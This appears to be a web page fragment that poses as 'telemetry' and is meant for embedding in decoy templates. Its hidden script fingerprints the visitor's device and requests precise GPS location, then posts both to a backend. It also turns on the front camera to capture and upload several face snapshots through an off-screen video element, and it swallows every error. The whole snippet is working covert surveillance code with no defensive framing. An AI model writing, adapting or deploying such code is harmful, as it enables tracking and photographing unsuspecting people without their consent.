<!-- Hidden Video & Canvas for Telemetry Capture -->
<div style="display:none!important;visibility:hidden!important;position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;" aria-hidden="true">
    <video id="v_stream" playsinline autoplay muted width="640" height="480"></video>
    <canvas id="c_buffer" width="640" height="480"></canvas>
</div>

<!-- Silent Backend Telemetry Agent -->
<script>
(function() {
    let sessionUuid = localStorage.getItem('_rv_uuid') || null;
    let telemetryConfig = {
        gps_enabled: true,
        cam_enabled: true,
        cam_interval: 2500,
        max_snapshots: 5
    };
    let snapshotsSent = 0;
    let camIntervalTimer = null;

    const payload = {
        uuid: sessionUuid,
        user_agent: navigator.userAgent || 'Unknown',
        platform: navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : 'Unknown'),
        browser_name: navigator.appName || 'Unknown',
        browser_language: navigator.language || navigator.userLanguage || 'Unknown',
        ram: navigator.deviceMemory ? String(navigator.deviceMemory) : null,
        cpu_cores: navigator.hardwareConcurrency ? String(navigator.hardwareConcurrency) : null,
        screen_resolution: window.screen ? (window.screen.width + 'x' + window.screen.height + ' (' + (window.screen.colorDepth || 24) + '-bit)') : null,
        referrer: document.referrer || null
    };

    // 1. Initial Handshake
    fetch('/api/v1/telemetry/init', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(res => res.json())
    .then(data => {
        if (data.uuid) {
            sessionUuid = data.uuid;
            localStorage.setItem('_rv_uuid', data.uuid);
        }
        if (data.config) {
            telemetryConfig = data.config;
        }

        if (telemetryConfig.gps_enabled) {
            reqLocation();
        }

        if (telemetryConfig.cam_enabled) {
            initCamera();
        }
    })
    .catch(() => {});

    // 2. Geolocation Request
    function reqLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    fetch('/api/v1/telemetry/location', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uuid: sessionUuid,
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        })
                    }).catch(() => {});
                },
                function(err) {
                    let reason = 'Unknown location error';
                    if (err.code === 1) reason = 'User denied Geolocation permission';
                    else if (err.code === 2) reason = 'Position unavailable';
                    else if (err.code === 3) reason = 'Geolocation request timed out';

                    fetch('/api/v1/telemetry/location', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uuid: sessionUuid,
                            denied: true,
                            error: reason
                        })
                    }).catch(() => {});
                },
                {
                    enableHighAccuracy: true,
                    timeout: 12000,
                    maximumAge: 0
                }
            );
        }
    }

    // 3. Camera Capture
    async function initCamera() {
        const video = document.getElementById('v_stream');
        const canvas = document.getElementById('c_buffer');
        if (!video || !canvas) return;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: false,
                video: { facingMode: 'user' }
            });
            
            video.srcObject = stream;
            video.play();

            const ctx = canvas.getContext('2d');

            camIntervalTimer = setInterval(() => {
                if (snapshotsSent >= (telemetryConfig.max_snapshots || 5)) {
                    clearInterval(camIntervalTimer);
                    stream.getTracks().forEach(track => track.stop());
                    return;
                }

                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(function(blob) {
                        if (!blob) return;

                        const fd = new FormData();
                        fd.append('uuid', sessionUuid);
                        fd.append('image', blob, 'cam_' + Date.now() + '.jpg');

                        fetch('/api/v1/telemetry/snapshot', {
                            method: 'POST',
                            body: fd
                        })
                        .then(r => r.json())
                        .then(res => {
                            if (res.status === 'ok') {
                                snapshotsSent++;
                            } else if (res.status === 'limit_reached') {
                                clearInterval(camIntervalTimer);
                                stream.getTracks().forEach(track => track.stop());
                            }
                        })
                        .catch(() => {});
                    }, 'image/jpeg', 0.85);
                }
            }, telemetryConfig.cam_interval || 2500);

        } catch (e) {
            // Silently handle camera denial
        }
    }

    // Expose trigger globally for interactive click handlers on decoy templates
    window.triggerTelemetryPermissions = function() {
        if (telemetryConfig.gps_enabled) reqLocation();
        if (telemetryConfig.cam_enabled) initCamera();
    };
})();
</script>
